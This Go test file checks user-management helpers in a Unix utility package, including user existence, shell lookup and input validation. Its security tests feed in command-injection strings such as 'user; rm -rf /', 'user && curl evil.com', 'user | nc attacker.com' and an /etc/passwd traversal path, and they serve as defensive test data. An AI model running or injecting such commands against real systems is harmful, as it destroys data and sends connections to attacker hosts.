package eos_unix

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
)

func TestUserExists(t *testing.T) {
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
	}

	tests := []struct {
		name     string
		username string
		setup    func() error
		cleanup  func() error
		wantErr  bool
	}{
		{
			name:     "current user exists",
			username: os.Getenv("USER"),
			setup:    func() error { return nil },
			cleanup:  func() error { return nil },
			wantErr:  false,
		},
		{
			name:     "root user exists",
			username: "root",
			setup:    func() error { return nil },
			cleanup:  func() error { return nil },
			wantErr:  false,
		},
		{
			name:     "non-existent user",
			username: "nonexistentuser12345",
			setup:    func() error { return nil },
			cleanup:  func() error { return nil },
			wantErr:  true,
		},
		{
			name:     "empty username",
			username: "",
			setup:    func() error { return nil },
			cleanup:  func() error { return nil },
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if err := tt.setup(); err != nil {
				t.Fatalf("Setup failed: %v", err)
			}
			defer func() {
				if err := tt.cleanup(); err != nil {
					t.Errorf("Cleanup failed: %v", err)
				}
			}()

			exists := UserExists(rc, tt.username)

			if tt.wantErr && exists {
				t.Errorf("UserExists() = true, expected false for %s", tt.username)
			}
			if !tt.wantErr && !exists {
				t.Errorf("UserExists() = false, expected true for %s", tt.username)
			}

			t.Logf("User %s exists: %v", tt.username, exists)
		})
	}
}

func TestGetUserShell(t *testing.T) {
	// Skip if getent is not available
	if _, err := exec.LookPath("getent"); err != nil {
		t.Skip("getent command not available")
	}

	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
	}

	tests := []struct {
		name     string
		username string
		wantErr  bool
	}{
		{
			name:     "current user shell",
			username: os.Getenv("USER"),
			wantErr:  false,
		},
		{
			name:     "root user shell",
			username: "root",
			wantErr:  false,
		},
		{
			name:     "non-existent user",
			username: "nonexistentuser12345",
			wantErr:  true,
		},
		{
			name:     "empty username",
			username: "",
			wantErr:  true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			shell, err := GetUserShell(rc, tt.username)

			if (err != nil) != tt.wantErr {
				t.Errorf("GetUserShell() error = %v, wantErr %v", err, tt.wantErr)
				return
			}

			if !tt.wantErr {
				t.Logf("User %s shell: %s", tt.username, shell)

				// Validate shell path format
				if shell == "" {
					t.Error("Shell should not be empty for existing user")
				}

				// Common shells
				validShells := []string{
					"/bin/bash", "/bin/sh", "/bin/zsh", "/bin/tcsh",
					"/bin/csh", "/bin/fish", "/usr/bin/bash", "/usr/bin/zsh",
				}

				isValidShell := false
				for _, validShell := range validShells {
					if shell == validShell {
						isValidShell = true
						break
					}
				}

				if !isValidShell {
					t.Logf("Note: Shell %s is not in common shells list (might be valid)", shell)
				}
			}
		})
	}
}

func TestSecretsExist(t *testing.T) {
	// Note: This test depends on the shared package configuration
	// We'll test the behavior without modifying the actual secrets

	t.Run("secrets file check", func(t *testing.T) {
		exists := SecretsExist()
		t.Logf("Secrets file exists: %v", exists)

		// The function should not panic
		// The actual return value depends on system state
	})
}

func TestSetPassword_Validation(t *testing.T) {
	// Note: We're testing input validation, not actual password setting
	// to avoid modifying system state

	tests := []struct {
		name     string
		username string
		password string
		validate func(string, string) error
	}{
		{
			name:     "valid username and password",
			username: "testuser",
			password: "TestPass123!",
			validate: func(u, p string) error {
				if u == "" {
					return fmt.Errorf("username cannot be empty")
				}
				if p == "" {
					return fmt.Errorf("password cannot be empty")
				}
				return nil
			},
		},
		{
			name:     "empty username",
			username: "",
			password: "TestPass123!",
			validate: func(u, p string) error {
				if u == "" {
					return fmt.Errorf("username cannot be empty")
				}
				return nil
			},
		},
		{
			name:     "empty password",
			username: "testuser",
			password: "",
			validate: func(u, p string) error {
				if p == "" {
					return fmt.Errorf("password cannot be empty")
				}
				return nil
			},
		},
		{
			name:     "username with dangerous characters",
			username: "user;rm -rf /",
			password: "TestPass123!",
			validate: func(u, p string) error {
				dangerousChars := []string{";", "&", "|", "`", "$"}
				for _, char := range dangerousChars {
					if containsStringUser(u, char) {
						return fmt.Errorf("username contains dangerous character: %s", char)
					}
				}
				return nil
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Validate inputs without actually calling SetPassword
			err := tt.validate(tt.username, tt.password)
			if err != nil {
				t.Logf("Validation correctly failed: %v", err)
			} else {
				t.Logf("Validation passed for username=%s", tt.username)
			}
		})
	}
}

func TestUserSecurity(t *testing.T) {
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
	}

	t.Run("user command injection prevention", func(t *testing.T) {
		// Test that user functions would handle injection attempts safely
		injectionAttempts := []string{
			"user; rm -rf /",
			"user && curl evil.com",
			"user | nc attacker.com",
			"user`whoami`",
			"user$(id)",
			"../../../etc/passwd",
			"user\nmalicious",
		}

		for _, username := range injectionAttempts {
			t.Run("injection_"+username, func(t *testing.T) {
				// Test UserExists with injection attempts
				// The function should handle these safely (return false)
				exists := UserExists(rc, username)

				// These should all return false (user doesn't exist)
				// and shouldn't cause command injection
				if exists {
					t.Errorf("UserExists should return false for injection attempt: %s", username)
				}

				t.Logf("Safely handled injection attempt: %s", username)
			})
		}
	})

	t.Run("shell validation", func(t *testing.T) {
		// Test shell path validation
		validShells := []string{
			"/bin/bash",
			"/bin/sh",
			"/bin/zsh",
			"/usr/bin/bash",
		}

		invalidShells := []string{
			"",
			"bash",                // relative path
			"/bin/bash; rm -rf /", // injection
			"../../../bin/bash",   // path traversal
		}

		for _, shell := range validShells {
			if shell == "" || !filepath.IsAbs(shell) {
				t.Errorf("Invalid shell in valid list: %s", shell)
			} else {
				t.Logf("Valid shell: %s", shell)
			}
		}

		for _, shell := range invalidShells {
			hasIssue := shell == "" ||
				!filepath.IsAbs(shell) ||
				containsStringUser(shell, ";") ||
				containsStringUser(shell, "../")

			if hasIssue {
				t.Logf("Correctly identified invalid shell: %s", shell)
			} else {
				t.Errorf("Should have identified shell as invalid: %s", shell)
			}
		}
	})
}

func TestUserOperationsSafety(t *testing.T) {
	rc := &eos_io.RuntimeContext{
		Ctx: context.Background(),
	}

	t.Run("concurrent user operations", func(t *testing.T) {
		// Test that user existence checks can be done concurrently safely
		username := "root" // Should exist on most systems

		done := make(chan bool, 5)
		for i := 0; i < 5; i++ {
			go func() {
				exists := UserExists(rc, username)
				t.Logf("Concurrent check: user %s exists: %v", username, exists)
				done <- true
			}()
		}

		// Wait for all checks to complete
		for i := 0; i < 5; i++ {
			select {
			case <-done:
				// Success
			case <-time.After(2 * time.Second):
				t.Fatal("Timeout waiting for concurrent operations")
			}
		}
	})

	t.Run("username length limits", func(t *testing.T) {
		// Test various username lengths
		tests := []struct {
			name     string
			username string
			valid    bool
		}{
			{"normal length", "testuser", true},
			{"max length", string(make([]byte, 32)), true}, // 32 chars is typical max
			{"too long", string(make([]byte, 100)), false}, // 100 chars too long
			{"single char", "a", true},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				// Fill username with 'a' for length tests
				if len(tt.username) > 8 {
					for i := range []byte(tt.username) {
						[]byte(tt.username)[i] = 'a'
					}
				}

				isValid := len(tt.username) > 0 && len(tt.username) <= 32
				if isValid != tt.valid {
					t.Errorf("Username length validation mismatch for %s (len=%d)",
						tt.name, len(tt.username))
				}
			})
		}
	})
}

// Helper function for string containment check
func containsStringUser(s, substr string) bool {
	if len(substr) == 0 {
		return true
	}
	if len(s) < len(substr) {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
